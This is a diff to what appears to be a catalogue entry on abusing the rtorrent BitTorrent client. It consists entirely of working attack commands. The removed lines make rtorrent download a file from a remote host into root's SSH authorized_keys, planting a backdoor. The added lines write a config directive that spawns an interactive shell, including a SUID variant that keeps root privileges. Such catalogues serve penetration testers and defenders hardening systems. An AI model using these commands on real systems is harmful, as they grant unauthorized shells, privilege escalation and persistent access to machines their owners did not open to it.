@@ -1,18 +1,11 @@
 ---
-description: a BitTorrent client for ncurses.
 functions:
-  file-write:
+  shell:
     - code: |
-        cat >> ~/.rtorrent.rc <<EOF
-        execute.throw = mkdir,/root/.ssh
-        execute.throw = wget,http://$RHOST:$RPORT/$RFILE,-O,/root/.ssh/authorized_keys
-        EOF
+        echo "execute = /bin/sh,-c,\"/bin/sh <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
         rtorrent
   suid:
     - code: |
-        cat >> ~/.rtorrent.rc <<EOF
-        execute.throw = mkdir,/root/.ssh
-        execute.throw = wget,http://$RHOST:$RPORT/$RFILE,-O,/root/.ssh/authorized_keys
-        EOF
+        echo "execute = /bin/sh,-p,-c,\"/bin/sh -p <$(tty) >$(tty) 2>$(tty)\"" >~/.rtorrent.rc
         ./rtorrent
 ---
